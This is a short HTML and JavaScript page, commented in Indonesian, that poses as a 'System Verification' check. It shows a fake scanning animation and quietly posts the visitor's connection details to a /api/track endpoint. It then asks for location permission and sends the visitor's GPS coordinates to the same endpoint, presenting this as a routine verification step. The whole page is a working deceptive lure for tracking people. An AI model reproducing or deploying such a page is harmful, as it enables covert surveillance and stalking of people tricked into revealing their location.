<!DOCTYPE html>
<html>
<head>
  <title>System Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; font-family:sans-serif; background:#0d0d0d; color:white; text-align:center;">

<div style="padding:40px;">
  <h2>🔐 System Verification</h2>
  <p id="status">Initializing...</p>

  <div style="width:100%; background:#222; border-radius:10px; overflow:hidden; margin:20px 0;">
    <div id="bar" style="height:10px; width:0%; background:#00ffcc;"></div>
  </div>

  <button id="btn" onclick="start()" 
    style="display:none; padding:15px 25px; background:#00ffcc; border:none; border-radius:10px; font-size:18px; font-weight:bold; cursor:pointer;">
    📍 Izinkan Lokasi
  </button>
</div>

<script>
const koneksi = navigator.connection || {};
const jenisKoneksi = koneksi.effectiveType || "unknown";

// kirim IP dulu
fetch("/api/track", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    koneksi: jenisKoneksi,
    type: "ip"
  })
});

// animasi loading
const steps = [
  "Scanning device...",
  "Checking network...",
  "Validating access...",
  "Almost done..."
];

let i = 0;
let progress = 0;

const interval = setInterval(() => {

  if (i < steps.length) {
    document.getElementById("status").innerText = steps[i];
    i++;
  }

  progress += 25;
  document.getElementById("bar").style.width = progress + "%";

  if (progress >= 100) {
    clearInterval(interval);

    document.getElementById("status").innerText = "Verifikasi lokasi diperlukan";
    document.getElementById("btn").style.display = "inline-block";
  }

}, 800);


// 🔥 fungsi tombol
function start() {

  const btn = document.getElementById("btn");

  // ubah tampilan tombol
  btn.innerText = "⏳ Memproses...";
  btn.style.background = "#555";
  btn.style.cursor = "not-allowed";
  btn.disabled = true;

  document.getElementById("status").innerText = "Meminta izin lokasi...";

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos) {

      fetch("/api/track", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          koneksi: jenisKoneksi,
          type: "gps"
        })
      });

      document.getElementById("status").innerText = "✔ Lokasi berhasil diverifikasi";

    }, function() {
      document.getElementById("status").innerText = "❌ Izin lokasi ditolak";
    });

  } else {
    document.getElementById("status").innerText = "Browser tidak support GPS";
  }
}
</script>

</body>
</html>
